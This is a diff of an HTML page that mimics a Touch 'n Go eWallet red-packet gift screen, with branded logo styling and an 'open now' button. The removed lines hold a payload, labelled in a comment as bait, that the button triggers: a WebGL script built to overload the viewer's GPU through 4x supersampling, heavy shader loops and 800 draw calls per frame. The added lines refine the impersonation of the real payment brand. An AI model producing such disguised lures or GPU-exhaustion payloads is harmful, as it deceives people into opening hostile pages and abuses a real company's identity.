@@ -5,137 +5,99 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Touch 'n Go eWallet</title>
     <style>
-        :root { --tng-blue: #0056b3; --bg-cream: #fcebd2; }
-        body, html { margin: 0; padding: 0; height: 100%; width: 100%; font-family: sans-serif; background-color: var(--bg-cream); overflow: hidden; }
-        
-        /* Bait UI remains the same */
-        #gift-page { position: absolute; width: 100%; height: 100%; display: flex; flex-direction: column; align-items: center; z-index: 10; background: linear-gradient(to bottom, #fdf2e2 0%, #f7d794 100%); }
-        .packet-card { width: 90%; max-width: 350px; background: linear-gradient(180deg, #e53935 0%, #b71c1c 100%); border-radius: 30px; padding: 50px 0; display: flex; flex-direction: column; align-items: center; margin-top: 5vh; box-shadow: 0 20px 40px rgba(0,0,0,0.3); }
-        .logo-box { width: 120px; height: 120px; background: #fff; border-radius: 20px; display: flex; align-items: center; justify-content: center; margin-bottom: 20px; }
-        .sender-name { color: #fff; font-size: 24px; font-weight: bold; margin-bottom: 40px; }
-        .btn-open { background: #fff; color: #0056b3; border: none; padding: 15px 60px; border-radius: 30px; font-size: 20px; font-weight: bold; cursor: pointer; }
+        :root {
+            --tng-blue: #005bb6;
+            --tng-yellow: #f9d806;
+            --bg-cream: #fcebd2;
+        }
 
-        #glCanvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; display: none; z-index: 1; }
-        #stats { position: fixed; top: 10px; left: 10px; color: #ff0000; font-family: monospace; background: rgba(0,0,0,0.9); padding: 10px; border: 2px solid #ff0000; display: none; z-index: 20; box-shadow: 0 0 20px red; }
+        body, html { margin: 0; padding: 0; height: 100%; width: 100%; font-family: 'Arial', sans-serif; background-color: var(--bg-cream); overflow: hidden; }
+
+        #gift-page {
+            position: absolute; width: 100%; height: 100%;
+            display: flex; flex-direction: column; align-items: center;
+            background: linear-gradient(to bottom, #fdf2e2 0%, #f7d794 100%);
+        }
+
+        .characters {
+            width: 100%; height: 30vh;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 200"><circle cx="100" cy="120" r="50" fill="%235d4037"/><circle cx="100" cy="130" r="45" fill="%23ffccbc"/><circle cx="200" cy="100" r="50" fill="%235d4037"/><circle cx="200" cy="110" r="45" fill="%23ffccbc"/><circle cx="300" cy="120" r="50" fill="%235d4037"/><circle cx="300" cy="130" r="45" fill="%23ffccbc"/></svg>');
+            background-repeat: no-repeat; background-position: center bottom; background-size: contain;
+        }
+
+        .packet-card {
+            width: 90%; max-width: 350px;
+            background: linear-gradient(180deg, #e53935 0%, #b71c1c 100%);
+            border-radius: 30px; padding: 50px 0;
+            display: flex; flex-direction: column; align-items: center;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            margin-top: -10px;
+        }
+
+        /* Adjusted Logo Box */
+        .logo-box {
+            width: 130px; height: 130px; 
+            background: var(--tng-blue);
+            border: 4px solid white;
+            border-radius: 25px; 
+            display: flex; 
+            flex-direction: column;
+            align-items: center;
+            justify-content: center; 
+            margin-bottom: 25px;
+            box-shadow: 0 8px 15px rgba(0,0,0,0.2);
+        }
+
+        /* "TOUCH" and "nGO" matching sizes */
+        .tng-brand-text {
+            color: white;
+            font-weight: 900;
+            font-size: 24px; /* Matches both lines */
+            line-height: 0.85;
+            font-style: italic;
+            text-transform: uppercase;
+            text-align: center;
+        }
+
+        .tng-brand-text span {
+            text-transform: none; /* Keeps the 'n' lowercase */
+        }
+
+        .tng-wallet-text {
+            color: var(--tng-yellow);
+            font-weight: bold;
+            font-size: 16px;
+            margin-top: 6px;
+            border-top: 1px solid rgba(255,255,255,0.3);
+            padding-top: 2px;
+        }
+
+        .from-label { color: rgba(255,255,255,0.8); font-size: 18px; margin-bottom: 8px; }
+        .sender-name { color: #ffffff; font-size: 28px; font-weight: bold; margin-bottom: 60px; letter-spacing: 1px; }
+
+        .btn-open {
+            background: #ffffff; color: var(--tng-blue); border: none;
+            padding: 18px 70px; border-radius: 40px;
+            font-size: 22px; font-weight: bold; cursor: pointer;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.15);
+        }
     </style>
 </head>
 <body>
 
 <div id="gift-page">
-    <div style="height:20vh"></div>
+    <div class="characters"></div>
     <div class="packet-card">
         <div class="logo-box">
-            <div style="text-align:center;">
-                <div style="background:#0056b3; color:white; padding:2px 8px; border-radius:4px; font-weight:bold; font-size:12px;">Touch 'n Go</div>
-                <div style="color:#0056b3; font-style:italic; font-weight:bold; font-size:14px;">eWallet</div>
-            </div>
+            <div class="tng-brand-text">Touch</div>
+            <div class="tng-brand-text"><span>'n</span>Go</div>
+            <div class="tng-wallet-text">eWallet</div>
         </div>
-        <div style="color:rgba(255,255,255,0.8); margin-bottom:5px;">来自</div>
-        <div class="sender-name">Datuk Kenny</div>
-        <button class="btn-open" onclick="startMeltdown()">立即打开</button>
+        <div class="from-label">来自</div>
+        <div class="sender-name">CHEN YAN LIM</div>
+        <button class="btn-open">立即打开</button>
     </div>
 </div>
 
-<div id="stats">
-    <div style="font-weight:bold;">CRITICAL OVERLOAD (+150% TOTAL)</div>
-    <div style="font-size: 28px;">FPS: <span id="fps">--</span></div>
-</div>
-<canvas id="glCanvas"></canvas>
-
-<script>
-    function startMeltdown() {
-        document.getElementById('gift-page').style.display = 'none';
-        document.getElementById('glCanvas').style.display = 'block';
-        document.getElementById('stats').style.display = 'block';
-        
-        const canvas = document.getElementById('glCanvas');
-        const gl = canvas.getContext('webgl', { antialias: false, stencil: true });
-
-        // FORCE 4x Super-Sampling (16x the pixel workload)
-        const ratio = 4.0; 
-        canvas.width = window.innerWidth * ratio;
-        canvas.height = window.innerHeight * ratio;
-
-        const vs = `attribute vec2 p; void main() { gl_Position = vec4(p, 0, 1); }`;
-        
-        // This shader uses "Dependent Texture Reads" (simulated via high-prec loops)
-        // to force the GPU to stall its pipeline.
-        const fs = `
-            precision highp float;
-            uniform float uTime;
-            uniform vec2 uRes;
-
-            float hash(vec2 p) {
-                return fract(sin(dot(p, vec2(127.1, 311.7))) * 43758.5453123);
-            }
-
-            void main() {
-                vec2 uv = gl_FragCoord.xy / uRes.xy;
-                vec3 col = vec3(0.0);
-                
-                // Nested loops to maximize register pressure
-                for(int i=0; i<25; i++) {
-                    float fi = float(i);
-                    for(int j=0; j<5; j++) {
-                        float fj = float(j);
-                        // Extremely complex transcendental math
-                        float noise = hash(uv + fi + fj + uTime);
-                        float s = sin(length(uv - 0.5) * 500.0 + uTime + fj);
-                        col += vec3(noise * s, s * 0.1, abs(tan(uTime)));
-                        
-                        // Break the SIMD execution flow (Branching)
-                        if(col.r > 0.8) col.g += 0.1;
-                        else col.b += 0.1;
-                    }
-                    // Force dependency: next iteration relies on previous color
-                    uv += col.rb * 0.0005;
-                }
-                
-                gl_FragColor = vec4(col * 0.01, 0.1);
-            }
-        `;
-
-        const compile = (gl, type, src) => {
-            const s = gl.createShader(type);
-            gl.shaderSource(s, src); gl.compileShader(s); return s;
-        };
-
-        const prg = gl.createProgram();
-        gl.attachShader(prg, compile(gl, gl.VERTEX_SHADER, vs));
-        gl.attachShader(prg, compile(gl, gl.FRAGMENT_SHADER, fs));
-        gl.linkProgram(prg); gl.useProgram(prg);
-
-        const buf = gl.createBuffer();
-        gl.bindBuffer(gl.ARRAY_BUFFER, buf);
-        gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,1,-1,-1,1,-1,1,1,-1,1,1]), gl.STATIC_DRAW);
-        const pLoc = gl.getAttribLocation(prg, "p");
-        gl.enableVertexAttribArray(pLoc);
-        gl.vertexAttribPointer(pLoc, 2, gl.FLOAT, false, 0, 0);
-
-        gl.enable(gl.BLEND);
-        gl.blendFunc(gl.SRC_COLOR, gl.DST_COLOR); // Max Memory Bandwidth Load
-
-        let last = 0, frames = 0;
-        function render(now) {
-            frames++;
-            if (now - last >= 1000) {
-                document.getElementById('fps').innerText = Math.max(0, frames);
-                frames = 0; last = now;
-            }
-
-            gl.viewport(0, 0, canvas.width, canvas.height);
-            gl.clear(gl.COLOR_BUFFER_BIT);
-            gl.uniform1f(gl.getUniformLocation(prg, "uTime"), now * 0.001);
-            gl.uniform2f(gl.getUniformLocation(prg, "uRes"), canvas.width, canvas.height);
-
-            // BUMPED TO 800 DRAW CALLS
-            for(let i = 0; i < 800; i++) {
-                gl.drawArrays(gl.TRIANGLES, 0, 6);
-            }
-            requestAnimationFrame(render);
-        }
-        requestAnimationFrame(render);
-    }
-</script>
 </body>
 </html>
